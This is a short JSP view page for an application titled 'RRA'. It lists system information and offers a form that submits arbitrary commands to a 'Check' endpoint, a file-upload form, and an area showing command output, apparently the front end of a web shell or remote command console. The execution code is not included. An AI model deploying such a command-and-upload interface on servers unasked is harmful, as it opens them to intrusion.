<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8"%>
<%@  taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<!DOCTYPE html>


<html>
<head>
<meta charset="UTF-8">
<link rel="stylesheet" href="css/style.css">
<title>RRA</title>
</head>
<body>
	<table id="infoTable">
		<thead>
			<tr>
				<th colspan="2">System info</th>
			</tr>
		</thead>
		<tbody>
			<c:forEach items="${info}" var="command">
				<tr>
					<td><c:out value="${command.name}"></c:out></td>
					<td><c:out value="${command.result}"></c:out></td>
				</tr>
			</c:forEach>
		</tbody>
	</table>

	<br>
	<br>

	<FORM METHOD=GET ACTION='Check'>
		<INPUT name='cmd' type=text> <INPUT type=submit value='Run'>
	</FORM>

	<form action="upload" method="post" enctype="multipart/form-data">
		<input type="file" name="file" /> 
		<input type="submit" name = "Upload" />
	</form>

	<pre>
		<c:out value="${cmd}"></c:out>
	</pre>


</body>
</html>